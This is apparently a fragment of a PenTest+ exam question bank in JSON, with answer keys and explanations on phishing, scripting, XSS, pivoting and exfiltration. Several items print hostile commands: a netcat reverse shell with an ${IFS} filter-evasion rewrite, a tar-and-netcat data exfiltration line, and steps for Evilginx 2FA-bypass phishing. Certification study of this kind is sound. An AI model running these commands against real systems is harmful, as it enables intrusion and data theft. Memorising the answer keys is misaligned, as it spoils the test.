    "explanation": "To bypass two-factor authentication (2FA) and gain access to the executives’ accounts, the tester should use \nEvilginx with a typosquatting domain. Evilginx is a man-in-the-middle attack framework used to bypass 2FA \nby capturing session tokens.\n\nPhishing with Evilginx:\n\nEvilginx is designed to proxy legitimate login pages, capturing credentials and 2FA tokens in the \nprocess.\n\nIt uses \"phishlets\" which are configurations that simulate real login portals.\n\nTyposquatting:\n\nTyposquatting involves registering domains that are misspelled versions of legitimate domains (e.\ng., example.co instead of example.com).\n\nThis technique tricks users into visiting the malicious domain, thinking it's legitimate.\n\nSteps:\n\nConfigure an External Domain: Register a typosquatting domain similar to the company’s \ndomain.\n\nSet Up Evilginx: Install and configure Evilginx on a server. Use a phishlet that mimics the \ncompany's mail portal.\n\nSend Phishing Emails: Craft phishing emails targeting the executives, directing them to the \ntyposquatting domain.\n\nCapture Credentials and 2FA Tokens: When executives log in, Evilginx captures their credentials \nand session tokens, effectively bypassing 2FA.\n\nPentest References:\n\nPhishing: Social engineering technique to deceive users into providing sensitive information.\n\nTwo-Factor Authentication Bypass: Advanced phishing attacks like those using Evilginx can capture \nand reuse session tokens, bypassing 2FA mechanisms.\n\nOSINT and Reconnaissance: Identifying key targets (executives) and crafting convincing phishing \nemails based on gathered information.\n\nUsing Evilginx with a typosquatting domain allows the tester to bypass 2FA and gain access to high-value \naccounts, demonstrating the effectiveness of advanced phishing techniques.",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 85,
    "question_text": "A penetration tester creates a list of target domains that require further enumeration. The tester writes the \nfollowing script to perform vulnerability scanning across the domains:\n\nline 1: #!/usr/bin/bash\nline 2: DOMAINS_LIST = \"/path/to/list.txt\"\nline 3: while read -r i; do\nline 4: nikto -h $i -o scan-$i.txt &\nline 5: done\n\nThe script does not work as intended. Which of the following should the tester do to fix the script?",
    "options": {
      "A": "Change line 2 to {\"domain1\", \"domain2\", \"domain3\", }.",
      "B": "Change line 3 to while true; read -r i; do.",
      "C": "Change line 4 to nikto $i | tee scan-$i.txt.",
      "D": "Change line 5 to done < \"$DOMAINS_LIST\"."
    },
    "correct_answer": "D",
    "explanation": "The issue with the script lies in how the while loop reads the file containing the list of domains. The current \nscript doesn't correctly redirect the file's content to the loop. Changing line 5 to done < \"$DOMAINS_LIST\" \ncorrectly directs the loop to read from the file.\n\nStep-by-Step Explanation\n\nOriginal Script:\n\nDOMAINS_LIST=\"/path/to/list.txt\"\n\nwhile read -r i; do\n\nnikto -h $i -o scan-$i.txt &\n\ndone\n\nIdentified Problem:\n\nThe while read -r i; do loop needs to know which file to read lines from. Without redirecting the \ninput file to the loop, it doesn't process any input.\n\nSolution:\n\nAdd done < \"$DOMAINS_LIST\" to the end of the loop to specify the input source.\n\nCorrected script:\n\nDOMAINS_LIST=\"/path/to/list.txt\"\n\nwhile read -r i; do\n\nnikto -h $i -o scan-$i.txt &\n\ndone < \"$DOMAINS_LIST\"\n\nExplanation:\n\ndone < \"$DOMAINS_LIST\" ensures that the while loop reads each line from DOMAINS_LIST.\n\nThis fix makes the loop iterate over each domain in the list and run nikto against each.\n\nReferences from Pentesting Literature:\n\nScripting a\n=================",
    "is_simulation": false,
    "domain": "3.0 Vulnerability Discovery and Analysis",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 141,
    "question_text": "A penetration tester has just started a new engagement. The tester is using a framework that breaks the life \ncycle into 14 components. Which of the following frameworks is the tester using?",
    "options": {
      "A": "OWASP MASVS",
      "B": "OSSTMM",
      "C": "MITRE ATT&CK",
      "D": "CREST"
    },
    "correct_answer": "B",
    "explanation": "The OSSTMM (Open Source Security Testing Methodology Manual) is a comprehensive framework for \nsecurity testing that includes 14 components in its life cycle. Here’s why option B is correct:\n\nOSSTMM: This methodology breaks down the security testing process into 14 components, covering \nvarious aspects of security assessment, from planning to execution and reporting.\n\nOWASP MASVS: This is a framework for mobile application security verification and does not have a \n14-component life cycle.\n\nMITRE ATT&CK: This is a knowledge base of adversary tactics and techniques but does not describe a \n14-component life cycle.\n\nCREST: This is a certification body for penetration testers and security professionals but does not \nprovide a specific 14-component framework.\n\nReferences from Pentest:\n\nAnubis HTB: Emphasizes the structured approach of OSSTMM in conducting comprehensive security \nassessments.\n\nWriteup HTB: Highlights the use of detailed methodologies like OSSTMM to cover all aspects of \nsecurity testing.\n\nConclusion:\n\nOption B, OSSTMM, is the framework that breaks the life cycle into 14 components, making it the correct \nanswer.\n=================",
    "is_simulation": false,
    "domain": "1.0 Engagement Management",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 54,
    "question_text": "A penetration tester discovers evidence of an advanced persistent threat on the network that is being tested. \nWhich of the following should the tester do next?",
    "options": {
      "A": "Report the finding.",
      "B": "Analyze the finding.",
      "C": "Remove the threat.",
      "D": "Document the finding and continue testing."
    },
    "correct_answer": "A",
    "explanation": "Upon discovering evidence of an advanced persistent threat (APT) on the network, the penetration tester \nshould report the finding immediately.\n\nAdvanced Persistent Threat (APT):\n\nDefinition: APTs are prolonged and targeted cyberattacks in which an intruder gains access to a \nnetwork and remains undetected for an extended period.\n\nSignificance: APTs often involve sophisticated tactics, techniques, and procedures (TTPs) aimed \nat stealing data or causing disruption.\n\nImmediate Reporting:\n\nCriticality: Discovering an APT requires immediate attention from the organization’s security \nteam due to the potential impact and persistence of the threat.\n\nChain of Command: Following the protocol for reporting such findings ensures that appropriate \nincident response measures are initiated promptly.\n\nOther Actions:\n\nAnalyzing the Finding: While analysis is important, it should be conducted by the incident \nresponse team after reporting.\n\nRemoving the Threat: This action should be taken by the organization’s security team following \nestablished incident response procedures.\n\nDocumenting and Continuing Testing: Documentation is crucial, but the immediate priority \nshould be reporting the APT to ensure prompt action.\n\nPentest References:\n\nIncident Response: Understanding the importance of immediate reporting and collaboration with the \norganization’s security team upon discovering critical threats like APTs.\n\nEthical Responsibility: Following ethical guidelines and protocols to ensure the organization can \nrespond effectively to significant threats.\n\nBy reporting the finding immediately, the penetration tester ensures that the organization’s security team is \nalerted to the presence of an APT, allowing them to initiate an appropriate incident response.\n=================",
    "is_simulation": false,
    "domain": "1.0 Engagement Management",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 194,
    "question_text": "During a web application assessment, a penetration tester identifies an input field that allows JavaScript \ninjection. The tester inserts a line of JavaScript that results in a prompt, presenting a text box when browsing \nto the page going forward. Which of the following types of attacks is this an example of?",
    "options": {
      "A": "SQL injection",
      "B": "SSRF",
      "C": "XSS",
      "D": "Server-side template injection"
    },
    "correct_answer": "C",
    "explanation": "Cross-Site Scripting (XSS) is an attack that involves injecting malicious scripts into web pages viewed by \nother users. Here’s why option C is correct:\n\nXSS (Cross-Site Scripting): This attack involves injecting JavaScript into a web application, which is \nthen executed by the user’s browser. The scenario describes injecting a JavaScript prompt, which is a \ntypical XSS payload.\n\nSQL Injection: This involves injecting SQL commands to manipulate the database and does not relate \nto JavaScript injection.\n\nSSRF (Server-Side Request Forgery): This attack tricks the server into making requests to unintended \nlocations, which is not related to client-side JavaScript execution.\n\nServer-Side Template Injection: This involves injecting code into server-side templates, not JavaScript \nthat executes in the user’s browser.\n\nReferences from Pentest:\n\nHorizontall HTB: Demonstrates identifying and exploiting XSS vulnerabilities in web applications.\n\nLuke HTB: Highlights the process of testing for XSS by injecting scripts and observing their execution \nin the browser.\n=================",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 106,
    "question_text": "Which of the following technologies is most likely used with badge cloning? (Select two).",
    "options": {
      "A": "NFC",
      "B": "RFID",
      "C": "Bluetooth",
      "D": "Modbus",
      "E": "Zigbee",
      "F": "CAN bus"
    },
    "correct_answer": "A B",
    "explanation": "Badge cloning typically involves copying the data from access control badges, which frequently utilize the \nfollowing technologies:\n\nNFC (Near-Field Communication):\n\nNFC is a subset of RFID technology that operates at short ranges (up to 10 cm). It is commonly \nused in modern access control systems, payment systems, and badge technologies. NFC cloning \ntools can intercept and copy badge data.\n\nRFID (Radio-Frequency Identification):\n\nRFID operates over a broader range of frequencies and distances than NFC. Many legacy access \nsystems use RFID badges, which are susceptible to cloning attacks using RFID readers and \ncloning devices.\n\nExclusions:\n\nBluetooth, Modbus, Zigbee, CAN bus are not typically used in badge-based access control systems and \nare unrelated to badge cloning.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)\n\nDomain 4.0 (Penetration Testing Tools)",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_multiple_answer"
  },
  {
    "question_number": 146,
    "question_text": "A penetration tester is conducting a vulnerability scan. The tester wants to see any vulnerabilities that may be \nvisible from outside of the organization. Which of the following scans should the penetration tester perform?",
    "options": {
      "A": "SAST",
      "B": "Sidecar",
      "C": "Unauthenticated",
      "D": "Host-based"
    },
    "correct_answer": "C",
    "explanation": "To see any vulnerabilities that may be visible from outside of the organization, the penetration tester should \nperform an unauthenticated scan.\n\nUnauthenticated Scan:\n\nDefinition: An unauthenticated scan is conducted without providing any credentials to the \nscanning tool. It simulates the perspective of an external attacker who does not have any prior \naccess to the system.\n\nPurpose: Identifies vulnerabilities that are exposed to the public and can be exploited without \nauthentication. This includes open ports, outdated software, and misconfigurations visible to the \noutside world.\n\nComparison with Other Scans:\n\nSAST (Static Application Security Testing): Analyzes source code for vulnerabilities, typically \nused during the development phase and not suitable for external vulnerability scanning.\n\nSidecar: This term is generally associated with microservices architecture and is not relevant to \nthe context of vulnerability scanning.\n\nHost-based: Involves scanning from within the network and often requires authenticated access to \nthe host to identify vulnerabilities. It is not suitable for determining external vulnerabilities.\n\nPentest References:\n\nExternal Vulnerability Assessment: Conducting unauthenticated scans helps identify the attack \nsurface exposed to external threats and prioritizes vulnerabilities that are accessible from the \ninternet.\n\nTools: Common tools for unauthenticated scanning include Nessus, OpenVAS, and Nmap.\n\nBy performing an unauthenticated scan, the penetration tester can identify vulnerabilities that an external \nattacker could exploit without needing any credentials or internal access.\n=================",
    "is_simulation": false,
    "domain": "3.0 Vulnerability Discovery and Analysis",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 62,
    "question_text": "While conducting a peer review for a recent assessment, a penetration tester finds the debugging mode is still \nenabled for the production system. Which of the following is most likely responsible for this observation?",
    "options": {
      "A": "Configuration changes were not reverted.",
      "B": "A full backup restoration is required for the server.",
      "C": "The penetration test was not completed on time.",
      "D": "The penetration tester was locked out of the system."
    },
    "correct_answer": "A",
    "explanation": "Debugging Mode:\n\nPurpose: Debugging mode provides detailed error messages and debugging information, useful \nduring development.\n\nRisk: In a production environment, it exposes sensitive information and vulnerabilities, making \nthe system more susceptible to attacks.\n\nCommon Causes:\n\nConfiguration Changes: During testing or penetration testing, configurations might be altered to \nfacilitate debugging. If not reverted, these changes can leave the system in a vulnerable state.\n\nOversight: Configuration changes might be overlooked during deployment.\n\nBest Practices:\n\nDeployment Checklist: Ensure a checklist is followed that includes reverting any debug \nconfigurations before moving to production.\n\nConfiguration Management: Use configuration management tools to track and manage changes.\n\nReferences from Pentesting Literature:\n\nThe importance of reverting configuration changes is highlighted in penetration testing guides to \nprevent leaving systems in a vulnerable state post-testing.\n\nHTB write-ups often mention checking and ensuring debugging modes are disabled in production \nenvironments.",
    "is_simulation": false,
    "domain": "5.0 Post-exploitation and Lateral Movement",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 187,
    "question_text": "A tester enumerated a firewall policy and now needs to stage and exfiltrate data captured from the \nengagement. Given the following firewall policy:\n\nAction | SRC\n| DEST\n| --\nBlock | 192.168.10.0/24 : 1-65535 | 10.0.0.0/24 : 22 | TCP\nAllow | 0.0.0.0/0 : 1-65535 | 192.168.10.0/24:443 | TCP\nAllow | 192.168.10.0/24 : 1-65535 | 0.0.0.0/0:443 | TCP\nBlock | . | . | *\n\nWhich of the following commands should the tester try next?",
    "options": {
      "A": "tar -zcvf /tmp/data.tar.gz /path/to/data && nc -w 3 <remote_server> 443 < /tmp/data.tar.gz",
      "B": "gzip /path/to/data && cp data.gz <remote_server> 443",
      "C": "gzip /path/to/data && nc -nvlk 443; cat data.gz ' nc -w 3 <remote_server> 22",
      "D": "tar -zcvf /tmp/data.tar.gz /path/to/data && scp /tmp/data.tar.gz <remote_server>"
    },
    "correct_answer": "A",
    "explanation": "Given the firewall policy, let's analyze the commands provided and determine which one is suitable for \nexfiltrating data through the allowed network traffic. The firewall policy rules are:\n\nBlock: Any traffic from 192.168.10.0/24 to 10.0.0.0/24 on port 22 (TCP).\n\nAllow: All traffic (0.0.0.0/0) to 192.168.10.0/24 on port 443 (TCP).\n\nAllow: Traffic from 192.168.10.0/24 to anywhere on port 443 (TCP).\n\nBlock: All other traffic (*).\n\nBreakdown of Options:\n\nOption A: tar -zcvf /tmp/data.tar.gz /path/to/data && nc -w 3 <remote_server> 443 < /tmp/data.tar.gz\n\nThis command compresses the data into a tar.gz file and uses nc (netcat) to send it to a remote \nserver on port 443.\n\nSince the firewall allows outbound connections on port 443 (both within and outside the subnet \n192.168.10.0/24), this command adheres to the policy and is the correct choice.\n\nOption B: gzip /path/to/data && cp data.gz <remote_server> 443\n\nThis command compresses the data but attempts to copy it directly to a server, which is not a \nvalid command. The cp command does not support network operations in this manner.\n\nOption C: gzip /path/to/data && nc -nvlk 443; cat data.gz | nc -w 3 <remote_server> 22\n\nThis command attempts to listen on port 443 and then send data over port 22. However, outbound \nconnections to port 22 are blocked by the firewall, making this command invalid.\n\nOption D: tar -zcvf /tmp/data.tar.gz /path/to/data && scp /tmp/data.tar.gz <remote_server>\n\nThis command uses scp to copy the file, which typically uses port 22 for SSH. Since the firewall \nblocks port 22, this command will not work.\n\nReferences from Pentest:\n\nGobox HTB: The Gobox write-up emphasizes the use of proper enumeration and leveraging allowed \nservices for exfiltration. Specifically, using tools like nc for data transfer over allowed ports, similar to \nthe method in Option A.\n\nForge HTB: This write-up also illustrates how to handle firewall restrictions by exfiltrating data through \nallowed ports and protocols, emphasizing understanding firewall rules and using appropriate commands \nlike curl and nc.\n\nHorizontall HTB: Highlights the importance of using allowed services and ports for data exfiltration. \nThe approach taken in Option A aligns with the techniques used in these practical scenarios where nc is \nused over an allowed port.\n=================",
    "is_simulation": false,
    "domain": "5.0 Post-exploitation and Lateral Movement",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 96,
    "question_text": "A penetration tester gains access to the target network and observes a running SSH server.\nWhich of the following techniques should the tester use to obtain the version of SSH running on the target \nserver?",
    "options": {
      "A": "Network sniffing",
      "B": "IP scanning",
      "C": "Banner grabbing",
      "D": "DNS enumeration"
    },
    "correct_answer": "C",
    "explanation": "Banner grabbing is used to extract version information from services, including SSH, FTP, and web servers.\n\nOption A (Network sniffing) #: Captures packets, but does not directly reveal service versions.\n\nOption B (IP scanning) #: Identifies active hosts, but not SSH versions.\n\nOption C (Banner grabbing) #: Correct.\n\nCan be performed with:\n\nnc <target> 22\n\nor\n\ntelnet <target> 22\n\nOption D (DNS enumeration) #: Retrieves domain name records, not SSH versions.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Service Enumeration & Banner Grabbing",
    "is_simulation": false,
    "domain": "2.0 Reconnaissance and Enumeration",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 9,
    "question_text": "A penetration tester is performing a security review of a web application. Which of the following should the \ntester leverage to identify the presence of vulnerable open-source libraries?",
    "options": {
      "A": "VM",
      "B": "IAST",
      "C": "DAST",
      "D": "SCA"
    },
    "correct_answer": "D",
    "explanation": "Software Composition Analysis (SCA) is used to analyze dependencies in applications and identify \nvulnerable open-source libraries.\n\nOption A (VM - Virtual Machine) #: A VM is a computing environment, not a vulnerability detection \ntool.\n\nOption B (IAST - Interactive Application Security Testing) #: IAST analyzes runtime behavior, but it \ndoes not specialize in detecting vulnerable libraries.\n\nOption C (DAST - Dynamic Application Security Testing) #: DAST scans running applications for \nvulnerabilities, but it does not analyze open-source libraries.\n\nOption D (SCA - Software Composition Analysis) #: Correct.\n\nIdentifies security flaws in dependencies.\n\nUsed for managing supply chain risks.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Software Composition Analysis (SCA)",
    "is_simulation": false,
    "domain": "3.0 Vulnerability Discovery and Analysis",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 99,
    "question_text": "A penetration tester has been provided with only the public domain name and must enumerate additional \ninformation for the public-facing assets.\nINSTRUCTIONS\nSelect the appropriate answer(s), given the output from each section.\nOutput 1 [...], Output 2 [...], Output 3 [...]",
    "options": null,
    "correct_answer": null,
    "explanation": "Output 1 Tool: TheHarvester\nOutput 1 Command: theharvester -d someclouddomain.org -l 200 -b google.com\nOutput 2 Commands: $ dig @8.8.8.8 +noall +answer someclouddomain.org; > nslookup someclouddomain.org 8.8.8.8\nOutput 3 Where domain hosted: Amazon\nOutput 3 Who registered domain: LocalComputerPro's, Inc.\nOutput 3 When domain registered: 1993-09-22T04:00:38Z",
    "is_simulation": true,
    "simulation_details": "Multiple outputs (TheHarvester, nslookup/dig, whois) are shown. User needs to identify the tool used for Output 1, select correct commands for Output 2, and extract specific details (hosting provider, registrar, registration date) from Output 3 using dropdowns.",
    "domain": "2.0 Reconnaissance and Enumeration",
    "question_type": "simulation"
  },
  {
    "question_number": 176,
    "question_text": "A penetration tester is trying to bypass a command injection blocklist to exploit a remote code execution \nvulnerability. The tester uses the following command:\n\nnc -e /bin/sh 10.10.10.16 4444\n\nWhich of the following would most likely bypass the filtered space character?",
    "options": {
      "A": "${IFS}",
      "B": "%0a",
      "C": "+ *",
      "D": "%20"
    },
    "correct_answer": "A",
    "explanation": "To bypass a command injection blocklist that filters out the space character, the tester can use ${IFS}. ${IFS} \nstands for Internal Field Separator in Unix-like systems, which by default is set to space, tab, and newline \ncharacters.\n\nCommand Injection:\n\nCommand injection vulnerabilities allow attackers to execute arbitrary commands on the host \noperating system via a vulnerable application.\n\nFilters or blocklists are often implemented to prevent exploitation by disallowing certain \ncharacters like spaces.\n\nBypassing Filters:\n\n${IFS}: Using ${IFS} instead of a space can bypass filters that block spaces. ${IFS} expands to \na space character in shell commands.\n\nExample: The command nc -e /bin/sh 10.10.10.16 4444 can be rewritten as nc${IFS}-e${IFS}/bin\n/sh${IFS}10.10.10.16${IFS}4444.\n\nAlternative Encodings:\n\n%0a: Represents a newline character in URL encoding.\n\n+: Sometimes used in place of space in URLs.\n\n%20: URL encoding for space.\n\nHowever, ${IFS} is most appropriate for shell command contexts.\n\nPentest References:\n\nCommand Injection: Understanding how command injection works and common techniques to exploit \nit.\n\nBypassing Filters: Using creative methods like environment variable expansion to bypass input filters \nand execute commands.\n\nShell Scripting: Knowledge of shell scripting and environment variables is crucial for effective \nexploitation.\n\nBy using ${IFS}, the tester can bypass the filtered space character and execute the intended command, \ndemonstrating the vulnerability's exploitability.",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 68,
    "question_text": "A penetration tester finishes a security scan and uncovers numerous vulnerabilities on several hosts. Based on \nthe targets' EPSS (Exploit Prediction Scoring System) and CVSS (Common Vulnerability Scoring System) \nscores, which of the following targets is the most likely to get attacked?",
    "options": {
      "A": "Target 1: EPSS Score = 0.6, CVSS Score = 4",
      "B": "Target 2: EPSS Score = 0.3, CVSS Score = 2",
      "C": "Target 3: EPSS Score = 0.6, CVSS Score = 1",
      "D": "Target 4: EPSS Score = 0.4, CVSS Score = 4.5"
    },
    "correct_answer": "A",
    "explanation": "The EPSS (Exploit Prediction Scoring System) estimates how likely a vulnerability is to be exploited. Higher \nEPSS scores indicate a higher likelihood of exploitation.\n\nOption A (Target 1) #:\n\nEPSS 0.6 (60% chance of exploitation)\n\nCVSS 4 (Medium severity)\n\n# Best candidate since it has the highest likelihood of exploitation.\n\nOption B (Target 2) #: EPSS 0.3 (30%) is lower, making it less likely to be attacked.\n\nOption C (Target 3) #: EPSS 0.6 is high, but CVSS 1 is very low, meaning the vulnerability is not \ncritical.\n\nOption D (Target 4) #: CVSS 4.5 is higher, but EPSS 0.4 is lower, meaning attackers are less likely to \nexploit it.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Vulnerability Prioritization with EPSS & CVSS",
    "is_simulation": false,
    "domain": "3.0 Vulnerability Discovery and Analysis",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 202,
    "question_text": "A tester completed a report for a new client. Prior to sharing the report with the client, which of the following \nshould the tester request to complete a review?",
    "options": {
      "A": "A generative AI assistant",
      "B": "The customer's designated contact",
      "C": "A cybersecurity industry peer",
      "D": "A team member"
    },
    "correct_answer": "D",
    "explanation": "Before sharing a report with a client, it is crucial to have it reviewed to ensure accuracy, clarity, and \ncompleteness. The best choice for this review is a team member. Here’s why:\n\nInternal Peer Review:\n\nFamiliarity with the Project: A team member who worked on the project or is familiar with the \nmethodologies used can provide a detailed and context-aware review.\n\nQuality Assurance: This review helps catch any errors, omissions, or inconsistencies in the report \nbefore it reaches the client.\n\nAlternative Review Options:\n\nA Generative AI Assistant: While useful for drafting and checking for language issues, it may not \nfully understand the context and technical details of the penetration test.\n\nThe Customer's Designated Contact: Typically, the client reviews the report after the internal \nreview to provide their perspective and request clarifications or additional details.\n\nA Cybersecurity Industry Peer: Although valuable, this option might not be practical due to \nconfidentiality concerns and the peer’s lack of specific context regarding the engagement.\n\nIn summary, an internal team member is the most suitable choice for a thorough and contextually accurate \nreview before sharing the report with the client.\n=================",
    "is_simulation": false,
    "domain": "1.0 Engagement Management",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 208,
    "question_text": "Which of the following tasks would ensure the key outputs from a penetration test are not lost as part of the \ncleanup and restoration activities?",
    "options": {
      "A": "Preserving artifacts",
      "B": "Reverting configuration changes",
      "C": "Keeping chain of custody",
      "D": "Exporting credential data"
    },
    "correct_answer": "A",
    "explanation": "Preserving artifacts ensures that key outputs from the penetration test, such as logs, screenshots, captured \ndata, and any generated reports, are retained for analysis, reporting, and future reference.\n\nImportance of Preserving Artifacts:\n\nDocumentation: Provides evidence of the test activities and findings.\n\nVerification: Allows for verification and validation of the test results.\n\nReporting: Ensures that all critical data is available for the final report.\n\nTypes of Artifacts:\n\nLogs: Capture details of the tools used, commands executed, and their outputs.\n\nScreenshots: Visual evidence of the steps taken and findings.\n\nCaptured Data: Includes network captures, extracted credentials, and other sensitive information.\n\nReports: Interim and final reports summarizing the findings and recommendations.\n\nBest Practices:\n\nSecure Storage: Ensure artifacts are stored securely to prevent unauthorized access.\n\nBackups: Create backups of critical artifacts to avoid data loss.\n\nDocumentation: Maintain detailed documentation of all artifacts for future reference.\n\nReferences from Pentesting Literature:\n\nPreserving artifacts is a standard practice emphasized in penetration testing methodologies to \nensure comprehensive documentation and reporting of the test.\n\nHTB write-ups often include references to preserved artifacts to support the findings and \nconclusions.\n\nStep-by-Step ExplanationReferences:\n\nPenetration Testing - A Hands-on Introduction to Hacking\n\nHTB Official Writeups\n=================",
    "is_simulation": false,
    "domain": "5.0 Post-exploitation and Lateral Movement",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 31,
    "question_text": "With one day left to complete the testing phase of an engagement, a penetration tester obtains the following \nresults from an Nmap scan:\n\nNot shown: 1670 closed ports\nPORT STATE SERVICE VERSION\n80/tcp open http Apache httpd 2.2.3 (CentOS)\n3306/tcp open mysql MySQL (unauthorized)\n8888/tcp open http lighttpd 1.4.32\n\nWhich of the following tools should the tester use to quickly identify a potential attack path?",
    "options": {
      "A": "msfvenom",
      "B": "SearchSploit",
      "C": "sqlmap",
      "D": "BeEF"
    },
    "correct_answer": "B",
    "explanation": "SearchSploit is a command-line interface for Exploit-DB that allows testers to quickly search for \nknown exploits based on software name and version.\n\nWith Apache 2.2.3, lighttpd 1.4.32, and MySQL, the tester can plug these into SearchSploit to identify \nvulnerabilities, matching the goal of finding quick attack paths with limited time.\n\nOther tools:\n\nmsfvenom: Payload generator, not a search tool.\n\nsqlmap: SQLi exploitation tool, useful for web apps with SQLi, but requires validation of such a vuln \nfirst.\n\nBeEF: Browser exploitation framework, not relevant here.\n\nCompTIA PenTest+ Reference:\n\nPT0-003 Objective 2.2 & 2.5: Exploit and identify attack paths.\n\nSearchSploit and Exploit-DB usage are recommended tools in CompTIA’s resources.",
    "is_simulation": false,
    "domain": "3.0 Vulnerability Discovery and Analysis",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 182,
    "question_text": "A penetration tester established an initial compromise on a host. The tester wants to pivot to other targets and \nset up an appropriate relay. The tester needs to enumerate through the compromised host as a relay from the \ntester's machine. Which of the following commands should the tester use to do this task from the tester's host?",
    "options": {
      "A": "attacker_host$ nmap -sT <target_cidr> | nc -n <compromised_host> 22",
      "B": "attacker_host$ mknod backpipe p attacker_host$ nc -l -p 8000 | 0<backpipe | nc <target_cidr> 80 | tee \nbackpipe",
      "C": "attacker_host$ nc -nlp 8000 | nc -n <target_cidr> attacker_host$ nmap -sT 127.0.0.1 8000",
      "D": "attacker_host$ proxychains nmap -sT <target_cidr>"
    },
    "correct_answer": "D",
    "explanation": "ProxyChains is a tool that allows you to route your traffic through a chain of proxy servers, which can be used \nto anonymize your network activity. In this context, it is being used to route Nmap scan traffic through the \ncompromised host, allowing the penetration tester to pivot and enumerate other targets within the network.\n\nUnderstanding ProxyChains:\n\nPurpose: ProxyChains allows you to force any TCP connection made by any given application to \nfollow through proxies like TOR, SOCKS4, SOCKS5, and HTTP(S).\n\nUsage: It’s commonly used to anonymize network traffic and perform actions through an \nintermediate proxy.\n\nCommand Breakdown:\n\nproxychains nmap -sT <target_cidr>: This command uses ProxyChains to route the Nmap scan \ntraffic through the configured proxies.\n\nNmap Scan (-sT): This option specifies a TCP connect scan.\n\nSetting Up ProxyChains:\n\nConfiguration File: ProxyChains configuration is typically found at /etc/proxychains.conf.\n\nAdding Proxy: Add the compromised host as a SOCKS proxy.\n\nStep-by-Step Explanationplaintext\n\nCopy code\n\nsocks4 127.0.0.1 1080\n\nExecution:\n\nStart Proxy Server: On the compromised host, run a SOCKS proxy (e.g., using ssh -D 1080 \nuser@compromised_host).\n\nRun ProxyChains with Nmap: Execute the command on the attacker's host.\n\nproxychains nmap -sT <target_cidr>\n\nReferences from Pentesting Literature:\n\nProxyChains is commonly discussed in penetration testing guides for scenarios involving \npivoting through a compromised host.\n\nHTB write-ups frequently illustrate the use of ProxyChains for routing traffic through \nintermediate systems.",
    "is_simulation": false,
    "domain": "5.0 Post-exploitation and Lateral Movement",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 104,
    "question_text": "A penetration tester needs to test a very large number of URLs for public access. Given the following code \nsnippet:\n\n1 import requests\n2 import pathlib\n3\n4 for url in pathlib.Path(\"urls.txt\").read_text().split(\"\\n\"):\n5 response = requests.get(url)\n6 if response.status == 401:\n7 print(\"URL accessible\")\n\nWhich of the following changes is required?",
    "options": {
      "A": "The condition on line 6",
      "B": "The method on line 5",
      "C": "The import on line 1",
      "D": "The delimiter in line 3"
    },
    "correct_answer": "A",
    "explanation": "Script Analysis:\n\nLine 1: import requests - Imports the requests library to handle HTTP requests.\n\nLine 2: import pathlib - Imports the pathlib library to handle file paths.\n\nLine 4: for url in pathlib.Path(\"urls.txt\").read_text().split(\"\\n\"): - Reads the urls.txt file, splits its \ncontents by newline, and iterates over each URL.\n\nLine 5: response = requests.get(url) - Sends a GET request to the URL and stores the response.\n\nLine 6: if response.status == 401: - Checks if the response status code is 401 (Unauthorized).\n\nLine 7: print(\"URL accessible\") - Prints a message indicating the URL is accessible.\n\nError Identification:\n\nThe condition if response.status == 401: is incorrect for determining if a URL is publicly \naccessible. A 401 status code indicates that the resource requires authentication.\n\nCorrect Condition:\n\nThe correct condition should check for a 200 status code, which indicates that the request was \nsuccessful and the resource is accessible.\n\nCorrected Script:\n\nReplace if response.status == 401: with if response.status_code == 200: to correctly identify \npublicly accessible URLs.\n\nPentest References:\n\nIn penetration testing, checking the accessibility of multiple URLs is a common task, often part of \nreconnaissance. Identifying publicly accessible resources can reveal potential entry points for further \ntesting.\n\nThe requests library in Python is widely used for making HTTP requests and handling responses. \nUnderstanding HTTP status codes is crucial for correctly interpreting the results of these requests.\n\nBy changing the condition to check for a 200 status code, the script will correctly identify and print URLs that \nare publicly accessible.\n=================",
    "is_simulation": false,
    "domain": "3.0 Vulnerability Discovery and Analysis",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 150,
    "question_text": "During a pre-engagement activity with a new customer, a penetration tester looks for assets to test. Which of \nthe following is an example of a target that can be used for testing?",
    "options": {
      "A": "API",
      "B": "HTTP",
      "C": "IPA",
      "D": "ICMP"
    },
    "correct_answer": "A",
    "explanation": "API as a Target:\n\nAPIs (Application Programming Interfaces) are common assets to test for vulnerabilities such as \nimproper authentication, data leakage, or injection attacks.\n\nTesting APIs often uncovers critical issues in modern applications.\n\nWhy Not Other Options?\n\nB (HTTP): This is a protocol, not a specific asset.\n\nC (IPA): Unrelated to penetration testing (likely a typo or irrelevant here).\n\nD (ICMP): This is a protocol used for network diagnostics, not an application asset.\n\nCompTIA Pentest+ References:\n\nDomain 1.0 (Planning and Scoping)",
    "is_simulation": false,
    "domain": "1.0 Engagement Management",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 230,
